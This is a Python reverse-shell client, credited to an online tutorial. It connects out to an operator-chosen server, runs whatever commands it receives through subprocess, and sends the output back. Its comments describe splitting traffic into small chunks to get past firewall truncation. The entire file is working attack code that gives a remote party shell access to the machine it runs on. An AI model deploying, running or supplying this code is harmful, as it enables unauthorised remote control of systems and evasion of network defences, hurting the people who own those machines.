##### Credits https://www.thepythoncode.com/article/create-reverse-shell-python #####


import socket
import os
import subprocess
import sys
import time
import getopt


def usage(error):
    if(error):
        print("")
        print("Missing server parameter!")
    print("")
    print("Usage: ")
    print("\tpython shell-client.py -s <SERVER> [-p <PORT> -b <BUFFER_SIZE>]")
    print("")
    print("Example:")
    print("\tpython shell-client.py -s 192.168.100.54 -p 44444 -b 50")
    print("\tpython shell-client.py -s example.com -p 44444 -b 50")
    print("")
    print("Default values:")
    print("\t-p 33333 (must be the same of server)")
    print("\t-b 100 (must be the same of server)")
    print("")
    print("-h or --help for details")
    print("")

def send_word(data, host, port):
    # create a different socket for each chunk to avoid connection truncation after the limit amount of byte 
    s = socket.socket()
    s.connect((host, port))
    s.send(data.encode())
    s.close()
    

def send_data(message, word, host, port):
    # split data into chunks to avoid connection truncation by the firewall
    chunks = [message[i:i+word] for i in range(0, len(message), word)]
    # send start message to let the server know the command output is coming
    send_word("[START]", host, port)
    # send n° of chunks the server has to receive
    send_word(str(len(chunks)), host, port)
    # send each chunk
    for w in chunks:
        send_word(str(w), host, port)

    

def receive_word(word, host, port):
    # create a different socket for each chunk to avoid connection truncation after the limit amount of byte 
    s = socket.socket()
    s.connect((host, port))
    w = s.recv(word).decode()
    s.close()
    return w

def receive_data(host, port, word):

    chunks_count = int(receive_word(word, host, port))
    message = ""
    for i in range(chunks_count):
        chunk = receive_word(word, host, port)
        message = message + chunk
    return message



#### main

SERVER_HOST = ''
#SERVER_HOST = 'ngfw.example.bug'
SERVER_PORT = 33333
BUFFER_SIZE = 100

# separator string to send both the commmand result and the working directory
SEP = "<-->"

try:
    options, args = getopt.getopt(sys.argv[1:], "s:p:b:h")
except getopt.GetoptError as error:
    # print help information and exit:
    print(error)  # will print something like "option -a not recognized"
    usage(False)
    sys.exit(2)

for option, arg in options:
    if option == "-p":
        SERVER_PORT = int(arg)
    elif option == "-s":
            SERVER_HOST = str(arg)
    elif option == "-b":
        BUFFER_SIZE = int(arg)
    elif option in ("-h", "--help"):
        usage(False)
        sys.exit()

if(len(SERVER_HOST) == 0):
    usage(True)
    sys.exit(2)


print ("items splitted")
print(f"Buffer size {BUFFER_SIZE}...")
print(f"Connecting to {SERVER_HOST}:{SERVER_PORT} ...")
print()

# get the current directory
working_dir = os.getcwd()
send_data(str(working_dir), BUFFER_SIZE, SERVER_HOST, SERVER_PORT)

while True:
    # receive the command from the server
    command = receive_data(SERVER_HOST, SERVER_PORT, BUFFER_SIZE)

    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)

    # get the current working directory as output
    working_dir = os.getcwd()

    # send the results back to the server
    message = f"{output}{SEP}{working_dir}"
    send_data(message, BUFFER_SIZE, SERVER_HOST, SERVER_PORT)
    
